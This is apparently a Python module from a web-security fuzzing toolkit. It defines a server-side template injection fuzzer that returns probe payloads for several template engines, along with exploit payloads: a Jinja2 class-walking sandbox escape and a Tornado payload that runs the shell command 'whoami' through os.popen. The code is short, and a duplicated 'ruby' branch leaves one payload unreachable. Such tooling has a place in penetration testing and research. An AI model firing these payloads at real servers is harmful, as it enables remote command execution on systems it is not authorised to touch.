#!/usr/bin/env python
# -*- coding: utf-8 -*-


from saker.fuzzers.fuzzer import Fuzzer


class SSTI(Fuzzer):

    """Server Side Template Injection"""

    def __init__(self, engine=""):
        super(SSTI, self).__init__()
        self.engine = engine

    def test(self):
        # simple mathematical expressions
        if self.engine == "Tornado":
            return "{% import module %}"
        elif self.engine == "Jinja2":
            return "{{ config.items() }}"
        elif self.engine == "Django":
            return "{{ request }}"
        elif self.engine == "ruby":
            # Basic injection
            return "<%= 7 * 7 %>"
        elif self.engine == "ruby":
            # Basic injection
            return "${7*7}"
        elif self.engine == "Twig":
            return "{{ 7*7 }}"

    def exp(self):
        if self.engine == "Jinja2":
            return "{{''.__class__.__mro__[2].__subclasses__()}}"
        elif self.engine == "Tornado":
            return '''{% import os %}{{ os.popen("whoami").read() }}'''
        else:
            return ""
